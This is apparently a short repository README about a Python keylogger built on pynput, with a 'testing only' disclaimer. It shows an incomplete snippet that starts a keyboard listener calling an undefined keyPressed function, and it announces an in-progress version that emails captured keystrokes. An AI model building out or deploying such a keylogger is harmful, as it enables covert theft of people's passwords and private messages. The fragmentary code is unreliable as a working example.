## This repository hold my keylogger made in Python. Please use this for testing only. 

Tools used Python

<h2> Created a Basic Keylogger </h2>

from pynput import keyboard



if __name__=="__main__":
    listener = keyboard.Listener(on_press=keyPressed)
    listener.start()
    input()

<h2>Created a Keylogger that can send emails.</h2> (In progress)
